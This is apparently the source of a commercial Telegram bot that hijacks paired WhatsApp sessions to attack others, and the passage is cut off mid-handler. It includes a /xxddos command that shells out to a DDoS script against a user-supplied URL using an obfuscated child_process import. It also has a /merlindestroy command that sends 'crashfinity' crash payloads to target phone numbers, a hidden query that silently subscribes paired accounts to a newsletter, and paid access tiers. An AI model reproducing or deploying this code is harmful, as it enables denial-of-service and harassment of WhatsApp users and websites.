process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, jidNormalizedUser } = require('@whiskeysockets/baileys');
const pino = require('pino');
let phoneNumber = "9999999999999"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")
const { ProxyPool } = require('./proxy');

console.clear();

process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err.message);
});
process.on('unhandledRejection', (reason) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason?.message || reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) fs.mkdirSync(LoveDir);

const { spawn } = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const activeBots  = {};
const startTime   = Date.now();
const LoveLogo    = `${config.logo}`;
const waSessions  = {};
const pairingTracker = new Map();

// ── Proxy pool (round-robin per session) ──────────
const proxyPool = new ProxyPool(config.proxies || []);

const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📢 Join Channel', url: config.channel }, { text: '👥 Join Group', url: config.group }, { text: '📣 Join Channel', url: config.schannel }],
            [{ text: '📢 WA Channel', url: config.waChannel || 'https://whatsapp.com/channel/0029VaGiJKfIiRoybPBMTy38' }],
            [{ text: '🎥 Subscribe YouTube', url: config.youtube || 'https://youtube.com@Teamsyedhaker' }],
            [{ text: '📸 Instagram', url: config.instagram || 'https://instagram.com@syeddlrofficial' }],
            [{ text: '✅ Check Membership', callback_data: 'check_membership' }]
        ]
    }
};

const protectionMessage =
    `<tg-emoji emoji-id='5188619509191173723'>😈</tg-emoji> <b>Access Denied!</b>\n\n` +
    `You must join our WhatsApp channel, Instagram, YouTube and group to use this bot.\n\n` +
    `After doing so, click <b>Check Membership</b> or use <code>/checkmembership</code>.`;

async function CheckSYlovesToo(S7, userId) {
    if (userId.toString() == config.adminId.toString()) return true;
    try {
        const channelMember = await S7.getChatMember(config.channelId, userId);
        const groupMember   = await S7.getChatMember(config.groupId, userId);
        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];
        return validStatuses.includes(channelMember.status) && validStatuses.includes(groupMember.status);
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message);
        return false;
    }
}

const SYLoves = `./SY/S7/`;
const CrashLogic          = require(SYLoves + 'crashfinity');
const stickerLogic        = require(SYLoves + 'StickerCrash');
const CallLogic           = require(SYLoves + 'CallCrash');
const XLogic              = require(SYLoves + 'Xdelay');
const IosLogic            = require(SYLoves + 'IosInvisible');
const XgcLogic            = require(SYLoves + 'Xgc');
const testlogic           = require(SYLoves + 'test');
const azzixdestroyedLogic = require(SYLoves + 'crashfinity');

const colors = {
    reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
    red: "\x1b[31m", magenta: "\x1b[35m", cyan: "\x1b[36m", yellow: "\x1b[33m"
};

function getRuntime() {
    const diff = Date.now() - startTime;
    const d = Math.floor(diff / 86400000);
    const h = Math.floor((diff / 3600000) % 24);
    const m = Math.floor((diff / 60000) % 60);
    return `${d}d ${h}h ${m}m`;
}

function log(type, user, message) {
    const time  = new Date().toLocaleTimeString();
    const ts    = `${colors.gray}[${time}]${colors.reset}`;
    const types = { info: `${colors.blue}INFO${colors.reset}`, success: `${colors.green}SUCCESS${colors.reset}`, error: `${colors.red}ERROR${colors.reset}`, command: `${colors.magenta}CMD${colors.reset}` };
    const u     = user ? `${colors.cyan}${user}${colors.reset}` : 'SYSTEM';
    console.log(`${ts} | ${types[type] || type} | ${u} | ${message}`);
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { state: 0, tokens: [], premium: [], resellers: [] };
    try {
        const parsed = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        if (Array.isArray(parsed)) return { state: 0, tokens: parsed, premium: [], resellers: [] };
        return { state: typeof parsed.state === 'number' ? parsed.state : 0, tokens: parsed.tokens || [], premium: parsed.premium || [], resellers: parsed.resellers || [] };
    } catch (err) {
        log('error', null, 'DB Read Error: ' + err.message);
        return { state: 0, tokens: [], premium: [], resellers: [] };
    }
};

const saveDB = (data) => {
    try { fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2)); }
    catch (err) { log('error', null, 'DB Save Error: ' + err.message); }
};

// ══════════════════════════════════════════════
//  EMOJI SHORTCUTS
// ══════════════════════════════════════════════
const E = {
    devil:    `<tg-emoji emoji-id='5188619509191173723'>😈</tg-emoji>`,
    devil2:   `<tg-emoji emoji-id='5359735919706382382'>😈</tg-emoji>`,
    cat:      `<tg-emoji emoji-id='5373137055188551739'>😽</tg-emoji>`,
    star:     `<tg-emoji emoji-id='5976353971982306766'>🤩</tg-emoji>`,
    star2:    `<tg-emoji emoji-id='5353036831581544549'>🤩</tg-emoji>`,
    think:    `<tg-emoji emoji-id='5134266530556544164'>🤔</tg-emoji>`,
    think2:   `<tg-emoji emoji-id='5134227274555458436'>🤔</tg-emoji>`,
    lips:     `<tg-emoji emoji-id='5327939288971620049'>👄</tg-emoji>`,
    chart:    `<tg-emoji emoji-id='5893470431838476721'>📈</tg-emoji>`,
    bolt:     `<tg-emoji emoji-id='5197621550190187874'>⚡️</tg-emoji>`,
    cross:    `<tg-emoji emoji-id='5260509290266912319'>✝️</tg-emoji>`,
    skull:    `<tg-emoji emoji-id='5190769956366604627'>🏴‍☠️</tg-emoji>`,
    green:    `<tg-emoji emoji-id='5888696111832503257'>🟢</tg-emoji>`,
    check:    `<tg-emoji emoji-id='5944894556309822281'>✅</tg-emoji>`,
    thumbs:   `<tg-emoji emoji-id='5231347566133658221'>👍</tg-emoji>`,
    shy:      `<tg-emoji emoji-id='5897520448559650257'>🤭</tg-emoji>`,
    spider:   `<tg-emoji emoji-id='5807434342749706730'>🕷</tg-emoji>`,
    ru:       `<tg-emoji emoji-id='4983278608828072791'>🇷🇺</tg-emoji>`,
    drink:    `<tg-emoji emoji-id='5217449524410199951'>🍸</tg-emoji>`,
    star3:    `<tg-emoji emoji-id='4985561998126220822'>✡️</tg-emoji>`,
};

// ══════════════════════════════════════════════
//  sendSYLove  —  unauthorized message
// ══════════════════════════════════════════════
function sendSYLove(bot, chatId) {
    bot.sendMessage(chatId,
        `${E.devil} <b>You are not authorized!</b>\n\n` +
        `${E.think2} Contact developer: <b>${config.S7}</b>\n\n` +
        `<blockquote>${E.bolt} <b>Price / Dam:</b>\n` +
        `${E.check} Permanent Access : <code>5$</code>\n` +
        `${E.check} Permanent Resell  : <code>7$</code>\n` +
        `${E.check} Script (No Encrypt): <code>10$</code></blockquote>`,
        { parse_mode: 'HTML' }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    const u = userId.toString();
    return u === config.adminId.toString() || db.resellers.includes(u) || db.premium.includes(u);
}

const Lovesbutton = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '⟬ Bug MenU ⟭', callback_data: 'bug_menu' }, { text: '⟬ Misc MenU ⟭', callback_data: 'misc_menu' }],
            [{ text: '⟬ ChanneL ⟭', url: `${config.channel}` }],
            [{ text: '⟬ GrouP ⟭', url: `${config.group}` }]
        ]
    }
};

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: { to: 's.whatsapp.net', type: 'get', xmlns: 'w:mex' },
            content: [{ tag: 'query', attrs: { query_id: '9926858900719341' }, content: new TextEncoder().encode(JSON.stringify({ variables: { newsletter_id: Buffer.from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64').toString('utf-8') } })) }]
        });
    } catch (_) {}
}

// ══════════════════════════════════════════════
//  HELPERS — proxy & socket health
// ══════════════════════════════════════════════

/** Returns true if the WebSocket is still open */
function isSocketAlive(sock) {
    try { return sock?.ws?.readyState === 1; } catch (_) { return false; }
}

/**
 * safeRelay — wraps any async bug call with a timeout.
 * Prevents 428 "Connection Closed" from stalling the
 * bot. Returns { ok, err } instead of throwing.
 */
async function safeRelay(fn, timeoutMs = 10000) {
    return new Promise(resolve => {
        const timer = setTimeout(() => resolve({ ok: false, err: 'timeout' }), timeoutMs);
        fn()
            .then(() => { clearTimeout(timer); resolve({ ok: true }); })
            .catch(err => {
                clearTimeout(timer);
                const code = err?.output?.statusCode || 0;
                // 428 = Connection Closed — log and skip, don't crash
                if (code === 428 || /connection closed/i.test(err.message)) {
                    log('error', 'RELAY', `428 Connection Closed — skipping (${err.message})`);
                }
                resolve({ ok: false, err: err.message, code });
            });
    });
}

// ══════════════════════════════════════════════
//  StartLovingSY — WhatsApp connect with proxy
// ══════════════════════════════════════════════
async function StartLovingSY(chatId, number, S7, isreconnect = false, proxyAgent = null) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    if (!fs.existsSync(authPath)) fs.mkdirSync(authPath, { recursive: true });

    const msgRetryCounterCache = new NodeCache();
    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(authPath);

    // Assign proxy agent (passed in or get next from pool)
    const agent = proxyAgent || proxyPool.next();

    const sockOpts = {
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })) },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async () => ({ conversation: '' }),
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 30000,   // faster failure detection
        connectTimeoutMs:      30000,
        keepAliveIntervalMs:   15000,
        retryRequestDelayMs:   250,
    };

    // Inject proxy if available
    if (agent) {
        sockOpts.agent      = agent;
        sockOpts.fetchAgent = agent;
    }

    const SYxS7 = makeWASocket(sockOpts);

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);
        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `SYEDTECH`);
            await S7.sendMessage(chatId,
                `<blockquote>${E.bolt}╭──────⟬ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 ⟭──────╮\n` +
                `│${E.spider} Nᴜᴍʙᴇʀ : <code>${number}</code>\n` +
                `│${E.bolt} Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ :ROWD-YBUG <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n` +
                (agent ? `│${E.green} Pʀᴏxʏ : Active\n` : '') +
                `╰───────────────────────╯</blockquote>`,
                { parse_mode: 'HTML' }
            );
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);
    SYxS7.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'connecting') log('info', 'WhatsApp', `Connecting: ${number}`);
        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}${agent ? ' [proxy]' : ''}`);
            pairingTracker.delete(number);
            try { await SYLoveMeOk(SYxS7); } catch (_) {}
            if (!waSessions[chatId]) waSessions[chatId] = [];
            // Replace stale session if number already exists
            const idx = waSessions[chatId].findIndex(s => s.num === number);
            if (idx >= 0) waSessions[chatId][idx] = { sock: SYxS7, num: number, agent };
            else          waSessions[chatId].push({ sock: SYxS7, num: number, agent });
            if (!isreconnect) {
                await delay(1000);
                await S7.sendMessage(chatId,
                    `<blockquote>${E.green} <b>WhatsApp Connected!</b>\n` +
                    `${E.spider} Number: <code>${number}</code>\n` +
                    (agent ? `${E.bolt} Proxy: Active\n` : '') +
                    `</blockquote>`,
                    { parse_mode: 'HTML' }
                ).catch(() => {});
            }
        }
        if (connection === "close") {
            if (waSessions[chatId]) waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            const reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed: ${number} (code ${reason})`);
            if ([DisconnectReason.restartRequired, DisconnectReason.connectionLost, DisconnectReason.timedOut, 515].includes(reason)) {
                log('info', 'WhatsApp', `Auto-reconnecting ${number} in 8s...`);
                setTimeout(() => StartLovingSY(chatId, number, S7, true, agent), 8000);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session ${number} LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId,
                    `<blockquote>${E.devil} <b>WhatsApp Logged Out</b>\n${E.spider} Number: <code>${number}</code>\n${E.think} Session terminated. Use <code>/reqpair</code> again.</blockquote>`,
                    { parse_mode: 'HTML' }
                ).catch(() => {});
                const p = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(p)) fs.rmSync(p, { recursive: true, force: true });
            } else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId,
                    `<blockquote>${E.think} <b>Connection Closed</b>\n${E.spider} Number: <code>${number}</code>\n${E.devil} Reason: <code>${reason}</code></blockquote>`,
                    { parse_mode: 'HTML' }
                ).catch(() => {});
            }
        }
    });
}

async function AutoLovingWithSY(S7) {
    const base = './Love/auth';
    if (!fs.existsSync(base)) return;
    try {
        let sessionIdx = 0;
        for (const chatId of fs.readdirSync(base)) {
            const cp = path.join(base, chatId);
            if (!fs.statSync(cp).isDirectory()) continue;
            for (const number of fs.readdirSync(cp)) {
                const sp = path.join(cp, number);
                if (fs.existsSync(path.join(sp, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    const agent = proxyPool.forSession(sessionIdx++);
                    StartLovingSY(chatId, number, S7, true, agent);
                    await delay(3000);
                }
            }
        }
    } catch (err) { log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`); }
}

async function S7Naverdead(token, errorMsg) {
    const db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(tokenObj.owner,
                `<blockquote>${E.devil} <b>Token Error</b>\n\n${E.think} Your bot token is not working.\n${E.skull} Reason: <code>${errorMsg}</code>\n\n${E.check} Token has been <b>removed automatically</b>.</blockquote>`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (_) { log('error', 'SYSTEM', 'Failed to notify token owner'); }
    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);
    if (activeBots[token]) {
        try { await activeBots[token].stopPolling(); } catch (_) {}
        delete activeBots[token];
    }
    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db  = getDB();
    const str = love.toString();
    if (str === config.adminId.toString()) return `${E.lips} Owner`;
    if (db.resellers.includes(str))        return `${E.chart} Reseller`;
    if (db.premium.includes(str))          return `${E.star} Premium`;
    return `${E.green} Free User`;
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);
    return (
        `<blockquote>` +
        `${E.lips}╭─〔 ${E.devil} <b>${config.bot}</b> ${E.devil} 〕─╮\n` +
        `│ ${E.star2} <b>NAME:</b> <code>${name}</code>\n` +
        `│ ${E.spider} <b>ID:</b> <code>${love}</code>\n` +
        `│ ${E.chart} <b>STATUS:</b> ${status}\n` +
        `│ ${E.bolt} <b>ONLINE:</b> <code>${uptime}</code>\n` +
        `${E.lips}╰──────────────${E.bolt}─╯` +
        `</blockquote>`
    );
}

function BvgSYLoVe(cleanTarget) {
    return (
        `<blockquote>` +
        `${E.skull}┏━━━━〔 ${E.devil2} 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ${E.devil2} 〕━━━━┓\n` +
        `┃ ${E.cat} ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n` +
        `┃ ${E.think} ʙᴏᴛ ɪs sᴇɴᴅɪɴɢ ʙᴜɢ ɴᴏᴡ\n` +
        `┃ ${E.spider} Tᴀʀɢᴇᴛ : <code>${cleanTarget}</code>\n` +
        `${E.skull}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛` +
        `</blockquote>`
    );
}

function getRandomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

process.once('SIGINT',  () => { console.log('Stopping...'); process.exit(0); });
process.once('SIGTERM', () => { console.log('Stopping...'); process.exit(0); });

// ══════════════════════════════════════════════
//  startSYloveBot
// ══════════════════════════════════════════════
function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed: ${token.substring(0, 10)}... ${err.message}`);
            if (err.message.includes('404') || err.message.includes('401') || err.message.includes('Unauthorized')) {
                await S7Naverdead(token, err.message);
            }
        });

        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];
            S7.on('message', async (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);
                if (!commands.includes(cmd)) return;
                const chatId = msg.chat.id;
                const userId = msg.from.id;
                if (cmd !== 'checkmembership') {
                    const isMember = await CheckSYlovesToo(S7, userId);
                    if (!isMember) return S7.sendMessage(chatId, protectionMessage, { parse_mode: 'HTML', ...SYLovesButton });
                }
                try {
                    log('command', msg.from.first_name || 'Unknown', msg.text);
                    callback(msg);
                } catch (err) {
                    log('error', 'CMD', err.message);
                    S7.sendMessage(msg.chat.id, `${E.devil} <b>Internal error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
                }
            });
        }

        // ─── START / MENU ─────────────────────────────
        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name   = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();
            const love   = msg.from.id.toString();

            const userFile = path.join(LoveDir, 'user.json');
            let users = fs.existsSync(userFile) ? JSON.parse(fs.readFileSync(userFile, 'utf8')) : [];
            if (!users.find(u => u.id === chatId)) {
                users.push({ id: chatId, name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }

            const captionText =
                MainSYLoVe(name, uptime, love) +
                `\n<blockquote>${E.drink}╭──────⟬ 𝗣𝗿𝗲𝘀𝘀 𝗕𝘂𝘁𝘁𝗼𝗻 𝗠𝗲𝗻𝘂 ⟭──────╮\n` +
                `│ ${E.bolt} Select a menu below ${E.cat}\n` +
                `╰────────────────────╯</blockquote>`;

            S7.sendPhoto(chatId, LoveLogo, { caption: captionText, parse_mode: 'HTML', ...Lovesbutton })
              .catch(() => S7.sendMessage(chatId, captionText, { parse_mode: 'HTML', ...Lovesbutton }));
        });

        // ─── XXDDOS ───────────────────────────────────
        SYLoVe('xxddos', (msg) => {
            const chatId = msg.chat.id;
            const args   = msg.text.split(' ').slice(1);
            if (args.length < 2) {
                return S7.sendMessage(chatId,
                    `${E.devil} <b>Usage:</b>\n<blockquote>/xxddos &lt;web&gt; &lt;time&gt;\n\nExample:\n/xxddos https://example.com 60</blockquote>`,
                    { parse_mode: 'HTML' }
                );
            }
            const [target, time] = args;
            S7.sendMessage(chatId,
                `<blockquote>${E.bolt} <b>Attacking Target</b>\n\n` +
                `${E.skull} Target: <code>${target}</code>\n` +
                `${E.think} Time: <code>${time}</code> seconds\n\n` +
                `${E.green} Process started... ${E.cat}</blockquote>`,
                { parse_mode: 'HTML' }
            );
            spawn(`node ./SY/ddos.js ${target} ${time}`, { shell: true, stdio: 'inherit' });
        });

        // ─── CHECK MEMBERSHIP ─────────────────────────
        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            const isMember = await CheckSYlovesToo(S7, userId);
            if (isMember) {
                S7.sendMessage(chatId,
                    `${E.check} <b>Membership verified!</b>\n` +
                    `You are a member of both the channel and group.\n` +
                    `Try <code>/start</code> or <code>/reqpair</code>.`,
                    { parse_mode: 'HTML' }
                );
            } else {
                S7.sendMessage(chatId, protectionMessage, { parse_mode: 'HTML', ...SYLovesButton });
            }
        });

        // ─── ADD TOKEN ────────────────────────────────
        SYLoVe('addtoken', async (msg) => {
            const chatId   = msg.chat.id.toString();
            const userId   = msg.from.id.toString();
            const newToken = msg.text.split(' ')[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!newToken) return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/addtoken &lt;token&gt;</code>`, { parse_mode: 'HTML' });
            const db = getDB();
            if (db.tokens.find(t => t.token === newToken))
                return S7.sendMessage(chatId, `${E.think} <b>Token already connected.</b>`, { parse_mode: 'HTML' });
            if (db.tokens.filter(t => t.owner === userId).length >= 5)
                return S7.sendMessage(chatId,
                    `${E.skull} <b>Bot limit reached!</b>\n<blockquote>You can only add <b>5 bots maximum</b>.</blockquote>`,
                    { parse_mode: 'HTML' }
                );
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({ token: newToken, owner: userId });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId,
                    `<blockquote>${E.check} <b>Token Connected</b>\n${E.star} Bot: <b>${botInfo.first_name}</b>\n${E.lips} @${botInfo.username}</blockquote>`,
                    { parse_mode: 'HTML' }
                );
            } catch (_) {
                S7.sendMessage(chatId, `${E.devil} <b>Invalid token.</b>`, { parse_mode: 'HTML' });
            }
        });

        // ─── REQ PAIR ─────────────────────────────────
        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const number = msg.text.split(' ')[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId,
                `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/reqpair +999999999999</code>`, { parse_mode: 'HTML' });
            const sessionIdx = (waSessions[chatId] || []).length;
            const agent = proxyPool.forSession(sessionIdx);
            await StartLovingSY(chatId, number.replace(/[^0-9]/g, ''), S7, false, agent);
        });

        // ─── DEL PAIR ─────────────────────────────────
        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const number = msg.text.split(' ')[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!number) return S7.sendMessage(chatId,
                `${E.devil} <b>Provide a phone number.</b>\nExample: <code>/delpair +999999999999</code>`, { parse_mode: 'HTML' });
            const clean = number.replace(/[^0-9]/g, '');
            const p = `./Love/auth/${chatId}/${clean}`;
            if (fs.existsSync(p)) {
                try {
                    fs.rmSync(p, { recursive: true, force: true });
                    S7.sendMessage(chatId, `${E.check} <b>Session deleted!</b>\n${E.spider} Number: <code>${clean}</code>`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `${E.devil} <b>Failed:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
                }
            } else {
                S7.sendMessage(chatId, `${E.think} <b>No session found</b> for <code>${clean}</code>.`, { parse_mode: 'HTML' });
            }
        });

        // ─── DEL TOKEN ────────────────────────────────
        SYLoVe('deltoken', async (msg) => {
            const chatId   = msg.chat.id.toString();
            const userId   = msg.from.id.toString();
            const delToken = msg.text.split(' ')[1];
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!delToken) return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/deltoken &lt;token&gt;</code>`, { parse_mode: 'HTML' });
            const db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);
            if (!tokenObj || tokenObj.owner !== userId)
                return S7.sendMessage(chatId, `${E.devil} <b>No connected token found.</b>`, { parse_mode: 'HTML' });
            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);
            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', 'SYSTEM', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, `${E.check} <b>Token deleted successfully.</b>`, { parse_mode: 'HTML' });
        });

        // ─── MY TOKEN ─────────────────────────────────
        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const db     = getDB();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (myTokens.length === 0)
                return S7.sendMessage(chatId, `${E.think} <b>You have not added any tokens.</b>`, { parse_mode: 'HTML' });
            let text = `${E.star} <b>Your Connected Bots</b>\n────────────────────\n\n`;
            let i = 1;
            for (const item of myTokens) {
                try {
                    const bot  = new SY(item.token, { polling: false });
                    const info = await bot.getMe();
                    text += `${E.lips} <b>${i++}. ${info.first_name}</b>\n${E.spider} @${info.username}\n${E.think} Token: <code>${item.token}</code>\n────────────────────\n\n`;
                } catch (_) {
                    text += `${E.devil} <b>${i++}. Unknown Bot</b>\n${E.think} Token: <code>${item.token}</code>\n────────────────────\n\n`;
                }
            }
            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });

        // ─── ADD RESELL ───────────────────────────────
        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (Number(chatId) !== Number(config.adminId))
                return S7.sendMessage(chatId, `${E.skull} <b>You are not authorized!</b>`, { parse_mode: 'HTML' });
            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, `${E.devil} <b>Usage:</b> <code>/addresell ID</code>`, { parse_mode: 'HTML' });
            const db = getDB();
            if (db.resellers.includes(targetId))
                return S7.sendMessage(chatId, `${E.think} <b>User is already a Reseller.</b>`, { parse_mode: 'HTML' });
            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `${E.check} ID <code>${targetId}</code> added as <b>Reseller</b>. ${E.chart}`, { parse_mode: 'HTML' });
        });

        // ─── MERLIN DESTROY ───────────────────────────
        SYLoVe(['merlindestroy', 'destroy', 'nuclear'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args   = msg.text.split(' ');
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || !waSessions[chatId].length)
                return S7.sendMessage(chatId, `${E.devil} <b>No Number connected.</b> Use <code>/reqpair</code>.`, { parse_mode: 'HTML' });
            if (args.length < 2)
                return S7.sendMessage(chatId,
                    `${E.devil} <b>Usage:</b> <code>/merlindestroy number</code>\nExample: <code>/merlindestroy 919876543210</code>`, { parse_mode: 'HTML' });
            const cleanTarget   = args[1].replace(/[^0-9]/g, '');
            const targetJid     = `${cleanTarget}@s.whatsapp.net`;
            const count         = (args[2] && !isNaN(args[2])) ? Math.min(parseInt(args[2]), 3) : 1;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client        = randomSession.sock;
            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) return S7.sendMessage(chatId, `${E.devil} <b>This Number isn't on WhatsApp</b>`, { parse_mode: 'HTML' });
                log('command', msg.from.first_name, `MERLIN DESTROYED on ${cleanTarget} via ${randomSession.num}`);
                const caption =
                    `<blockquote>${E.skull}┏━━━━〔 ${E.devil2} 𝐄𝐌𝐏𝐈𝐑𝐄 𝗗𝗘𝗦𝗧𝗥𝗢𝗬𝗘𝗗 ${E.devil2} 〕━━━━┓\n` +
                    `┃ ${E.skull} Nuclear strike initiated\n` +
                    `┃ ${E.spider} Tᴀʀɢᴇᴛ : <code>${cleanTarget}</code>\n` +
                    `┃ ${E.think} Cᴏᴜɴᴛ : <b>${count}</b>\n` +
                    `┃ ${E.ru} Pʟᴀᴛꜰᴏʀᴍ : Android/iOS\n` +
                    `┃ ${E.green} Sᴛᴀᴛᴜs : <b>Destroying...</b>\n` +
                    `${E.skull}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</blockquote>`;
                await S7.sendPhoto(chatId, LoveLogo, { caption, parse_mode: 'HTML' });
                for (let i = 0; i < count; i++) {
                    if (!isSocketAlive(client)) break;
                    const r = await safeRelay(() => azzixdestroyedLogic.crashfinity(client, targetJid));
                    if (!r.ok) log('error', 'destroy', r.err);
                    if (i < count - 1) await new Promise(res => setTimeout(res, getRandomDelay(10000, 20000)));
                }
                await S7.sendMessage(chatId,
                    `<blockquote>${E.check} <b>MERLIN DESTROYED completed!</b>\n\n` +
                    `${E.spider} Target: <code>${cleanTarget}</code>\n` +
                    `${E.lips} Session: <code>${randomSession.num}</code>\n` +
                    `${E.skull} Attacks: <b>${count}</b> time(s)\n` +
                    `${E.bolt} Target destroyed! ${E.cat}</blockquote>`,
                    { parse_mode: 'HTML' }
                );
            } catch (err) {
                log('error', 'merlindestroy', err.message);
                S7.sendMessage(chatId, `${E.devil} <b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
            }
        });

        // ─── DEL RESELL ───────────────────────────────
        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (Number(chatId) !== Number(config.adminId))
